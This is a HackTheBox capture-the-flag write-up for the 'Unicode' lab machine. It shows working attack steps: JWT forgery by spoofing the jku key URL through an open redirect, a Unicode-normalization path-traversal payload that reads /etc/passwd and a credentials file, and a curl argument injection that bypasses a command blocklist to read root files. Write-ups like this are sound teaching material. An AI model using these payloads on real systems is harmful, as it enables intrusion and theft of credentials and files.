# Unicode - HackTheBox - Writeup
Linux, 30 Base Points, Medium

![info.JPG](images/info.JPG)

## Machine

![‏‏Unicode.JPG](images/Unicode.JPG)
 
## TL;DR

To solve this machine, we begin by enumerating open services using ```namp``` – finding ports ```22``` and ```80```.

***User***: Found JWT token, Use JWKS Spoofing (with redirect URL) and create a JWT token of the ```admin``` user, Found LFI and using that we read ```/etc/nginx/sites-available/default``` file and according to the comments we found another file ```/home/code/coder/db.yaml``` which contains the password of ```code``` user.

***Root***: By running ```sudo -l``` we found ```/usr/bin/treport``` binary, Decompiling it using ```pyinstxtractor``` and ```pycdc```, Using command injection on ```curl``` and we get the ```root``` flag.

![pwn.JPG](images/pwn.JPG)


## Unicode Solution

### User

Let's start with ```nmap``` scanning:

```console
┌─[evyatar@parrot]─[/hackthebox/Unicode]
└──╼ $ nmap -sV -sC -oA nmap/Unicode 10.10.11.126
Starting Nmap 7.80 ( https://nmap.org ) at 2022-01-22 03:24 IST
Nmap scan report for 10.10.11.126
Host is up (0.28s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Hackmedia
|_http-trane-info: Problem with XML parsing of /evox/about
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```

By observing port 80 we get the following web page:

![port80.JPG](images/port80.JPG)

Let's try to register:

![register.JPG](images/register.JPG)

And after successful register we get the following page:

![home.JPG](images/home.JPG)

By observing the web request we can see the following headers:
```HTTP
GET /dashboard/ HTTP/1.1
Host: 10.10.11.126
User-Agent: Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://10.10.11.126/register/
DNT: 1
Connection: close
Cookie: auth=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9oYWNrbWVkaWEuaHRiL3N0YXRpYy9qd2tzLmpzb24ifQ.eyJ1c2VyIjoiZXZ5YXRhcjkifQ.PstqaBET5ZCuRPsoBvsCWJRKmZf7EgX4AH4UYS-ij4eMzxaDru85Fzdt3capehgjOxVVoCoHCzrVUuqBlf6DxXdceNRpQHZAA3X7zRnyboDkL4fWvgXNPF52aN5MQf9qOVnGkY3KbWGc5vCGkJkvD7XPUq6DSJNrjXxbOD8rL11Zi7-OmG1-o1aM6G8pDlRPrWNC3dQhnIK3CQrDAe9GP46Nhy1KrLMpmnsEPR9IzrZdSigNCmrAChCInVTUethfwq4kjk02VKJ8rYlYLenr0bmadC1ksaucH9HsjlMFZLy7uN86s1fGZoZdpbHy5U7j-xYMXhyT46DRY1efjnfBMQ
Upgrade-Insecure-Requests: 1
Cache-Control: max-age=0

```

We can see the JWT token using [https://token.dev/](https://token.dev/):

![jwttoken.JPG](images/jwttoken.JPG)

We can see the URL [http://hackmedia.htb/static/jwks.json](http://hackmedia.htb/static/jwks.json), Let's try to observe it (Add the domain before to ```/etc/hosts```):

![jwks.JPG](images/jwks.JPG)

If we can change the URL of ```JKU``` we can use [JWKS Spoofing](https://www.youtube.com/watch?v=KUyuvnez0ks).

First, Let's create the key pairs using the [https://mkjwk.org/](https://mkjwk.org/):

![jwk_keys.JPG](images/jwk_keys.JPG)

Now, Let's copy the ```Public and Private Keypair``` (On the left) to [https://8gwifi.org/jwkconvertfunctions.jsp](https://8gwifi.org/jwkconvertfunctions.jsp) to convert it from JWK-to-PEM:

![jwktopem.JPG](images/jwktopem.JPG)

Next, We need to change the ```jku``` value to [http://hackmedia.htb/static/../redirect?url=10.10.14.14/jwks.json](http://hackmedia.htb/static/../redirect?url=10.10.14.14/jwks.json), As you can see we use the redirect URL from the home page.

And finally, Let's create a new JWT token using [https://jwt.io/](https://jwt.io/) - We need to change the username from ```evyatar9``` to ```admin```:

![adminjwt.JPG](images/adminjwt.JPG)

And by sending the generated JWT token we get a new page of the ```admin``` user:

![adminpanel.JPG](images/adminpanel.JPG)

On the left panel we can see the ```Saved Reports``` with the following URL [http://10.10.11.126/display/?page=quarterly.pdf](http://10.10.11.126/display/?page=quarterly.pdf), By using [unicode-normalization-vulnerabilities](https://lazarv.com/posts/unicode-normalization-vulnerabilities/) we can get an LFI vulnerability with the following URL [http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd](http://hackmedia.htb/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/passwd):

![passwd.JPG](images/passwd.JPG)

According to the HTTP response, we can see that is ```nginx``` server, Let's try to read the default configuration file using [http://10.10.11.126/display/?page=/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default](http://10.10.11.126/display/?page=/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/etc/nginx/sites-available/default):

![nginx_conf.JPG](images/nginx_conf.JPG)

According to the comments the credentials should be on ```/home/code/coder/db.yaml``` location, Let's read it using [http://10.10.11.126/display/?page=/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml](http://10.10.11.126/display/?page=/display/?page=%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/%EF%B8%B0/home/code/coder/db.yaml) and we can see the ```code``` user credentials which is ```B3stC0d3r2021@@!```:

![codecred.JPG](images/codecred.JPG)

Let's use this password using SSH:

```console
┌─[evyatar@parrot]─[/hackthebox/Unicode]
└──╼ $ ssh code@10.10.11.126
The authenticity of host '10.10.11.126 (10.10.11.126)' can't be established.
ECDSA key fingerprint is SHA256:0ItJgn3BqbEjsSvZRBYXQDCZL7YXnpldg3UdP1Bl4nE.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.126' (ECDSA) to the list of known hosts.
code@10.10.11.126's password: 
Welcome to Ubuntu 20.04.3 LTS (GNU/Linux 5.4.0-81-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Sat 05 Mar 2022 02:33:40 AM UTC

  System load:           0.0
  Usage of /:            49.0% of 5.46GB
  Memory usage:          50%
  Swap usage:            0%
  Processes:             315
  Users logged in:       0
  IPv4 address for eth0: 10.10.11.126
  IPv6 address for eth0: dead:beef::250:56ff:feb9:2305

 * Super-optimized for small spaces - read how we shrank the memory
   footprint of MicroK8s to make it the smallest full K8s around.

   https://ubuntu.com/blog/microk8s-memory-optimisation

8 updates can be applied immediately.
8 of these updates are standard security updates.
To see these additional updates run: apt list --upgradable


The list of available updates is more than a week old.
To check for new updates run: sudo apt update

code@code:~$ cat user.txt
b491e9f51d3322ef3fed4d641b3a775b

```

And we get the user flag ```b491e9f51d3322ef3fed4d641b3a775b```.


### Root

By running ```sudo -l``` we can see the following:
```console
code@code:~/coder$ sudo -l
Matching Defaults entries for code on code:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User code may run the following commands on code:
    (root) NOPASSWD: /usr/bin/treport
```

By running the binary we generate the following error:
```console
code@code:~/coder$ sudo /usr/bin/treport 
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:^CTraceback (most recent call last):
  File "treport.py", line 79, in <module>

[1538] Failed to execute script 'treport' due to unhandled exception!
```

We can see that is python compiled binary, Let's decompile it using [pyinstxtractor](https://github.com/LucifielHack/pyinstxtractor):

```console
┌─[evyatar@parrot]─[/hackthebox/Unicode/pyinstxtractor]
└──╼ $ python3 pyinstxtractor.py ../treport 
[+] Processing ../treport
[+] Pyinstaller version: 2.1+
[+] Python version: 38
[+] Length of package: 6798297 bytes
[+] Found 46 files in CArchive
[+] Beginning extraction...please standby
[+] Possible entry point: pyiboot01_bootstrap.pyc
[+] Possible entry point: pyi_rth_pkgutil.pyc
[+] Possible entry point: pyi_rth_multiprocessing.pyc
[+] Possible entry point: pyi_rth_inspect.pyc
[+] Possible entry point: treport.pyc
[+] Found 223 files in PYZ archive
[+] Successfully extracted pyinstaller archive: ../treport

You can now use a python decompiler on the pyc files within the extracted directory
```

Next, Let's decompile the ```pyc``` file using [pycdc](https://github.com/LucifielHack/pycdc):
```console
┌─[evyatar@parrot]─[/hackthebox/Unicode/]
└──╼ $ git clone https://github.com/LucifielHack/pycdc.git
┌─[evyatar@parrot]─[/hackthebox/Unicode/pycdc]
└──╼ $ cd pycdc && cmake CMakeLists.txt
...
-- Configuring done
-- Generating done
-- Build files have been written to: /hackthebox/Unicode/pycdc
┌─[evyatar@parrot]─[/hackthebox/Unicode/pycdc]
└──╼ $ make
...

```
Now we can use ```pycdc``` binary to decompile the file ```treport.pyc``` which generated from ```pyinstxtractor```:
```python
┌─[evyatar@parrot]─[/hackthebox/Unicode/pycdc]
└──╼ $ ./pycdc ../pyinstxtractor/treport_extracted/treport.pyc 
# Source Generated with Decompyle++
# File: treport.pyc (Python 3.8)

import os
import sys
from datetime import datetime
import re

class threat_report:
    
    def create(self):
Unsupported opcode: BEGIN_FINALLY
        file_name = input('Enter the filename:')
        content = input('Enter the report:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        file_path = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete

    
    def list_files(self):
        file_list = os.listdir('/root/reports/')
        files_in_dir = ' '.join((lambda .0: [ str(elem) for elem in .0 ])(file_list))
        print('ALL THE THREAT REPORTS:')
        print(files_in_dir)

    
    def read_file(self):
Unsupported opcode: BEGIN_FINALLY
        file_name = input('\nEnter the filename:')
        if '../' in file_name:
            print('NOT ALLOWED')
            sys.exit(0)
        contents = ''
        file_name = '/root/reports/' + file_name
    # WARNING: Decompyle incomplete

    
    def download(self):
        now = datetime.now()
        current_time = now.strftime('%H_%M_%S')
        command_injection_list = [
            '$',
            '`',
            ';',
            '&',
            '|',
            '||',
            '>',
            '<',
            '?',
            "'",
            '@',
            '#',
            '$',
            '%',
            '^',
            '(',
            ')']
        ip = input('Enter the IP/file_name:')
        res = bool(re.search('\\s', ip))
        if res:
            print('INVALID IP')
            sys.exit(0)
        if 'file' in ip and 'gopher' in ip or 'mysql' in ip:
            print('INVALID URL')
            sys.exit(0)
        cmd = '/bin/bash -c "curl ' + ip + ' -o /root/reports/threat_report_' + current_time + '"'
        os.system(cmd)


if __name__ == '__main__':
    obj = threat_report()
    print('1.Create Threat Report.')
    print('2.Read Threat Report.')
    print('3.Download A Threat Report.')
    print('4.Quit.')
    check = True
    if check:
        choice = input('Enter your choice:')
        
        try:
            choice = int(choice)
        finally:
            pass
        print('Wrong Input')
        sys.exit(0)
        if choice == 1:
            obj.create()
            continue

        if choice == 2:
            obj.list_files()
            obj.read_file()
            continue
        if choice == 3:
            obj.download()
            continue
        if choice == 4:
            check = False
            continue
        print('Wrong input.')
        continue
```

By analyzing the code, we can see ```curl``` command is used here to download, we can see also the command injection filter, we can bypass it using ```{--config,/root/root.txt}``` and we get:
```console
code@code:/tmp$ sudo /usr/bin/treport 
1.Create Threat Report.
2.Read Threat Report.
3.Download A Threat Report.
4.Quit.
Enter your choice:3
Enter the IP/file_name:{--config,/root/root.txt}
Warning: /root/root.txt:1: warning: '3067947f11ab914c8cdb94be39265fcc' is 
Warning: unknown
curl: no URL specified!
curl: try 'curl --help' or 'curl --manual' for more information
Enter your choice:
```

And we get the root flag ```3067947f11ab914c8cdb94be39265fcc```.